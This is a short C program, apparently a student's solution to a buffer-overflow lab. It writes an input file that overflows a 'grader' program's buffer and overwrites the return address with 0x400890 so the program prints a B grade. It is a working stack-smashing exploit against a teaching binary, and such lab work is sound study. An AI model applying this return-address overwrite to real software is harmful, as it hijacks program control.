#include <stdio.h>

/* this program creates a file named "dataB" to be used as input to grader */
/* this files contains the name Ehsan and then a null character and 42 exclamation marks */
/* this fills the entire buffer and then we overwrite the return address  with the value 0x400890 */
/* this redirects it to the section of code that prints the B grade*/

int main(void) {
    int i;
    FILE *fp = fopen("dataB", "w");
    
    /* putting in the name Ehsan*/
    fputc('E', fp);
    fputc('h', fp);
    fputc('s', fp);
    fputc('a', fp);
    fputc('n', fp);
    fputc('\0', fp);
    /* filling the rest of the buffer with exclamation marks */
    for (i = 0; i < 42; i++) {
        fputc('!', fp);
    }
/* overwriting the return address with 0x400890 */
    fputc(0x90, fp);
    fputc(0x08, fp);
    fputc(0x40, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);
    fputc(0x00, fp);

    
    
    fclose(fp);
    return 0;
}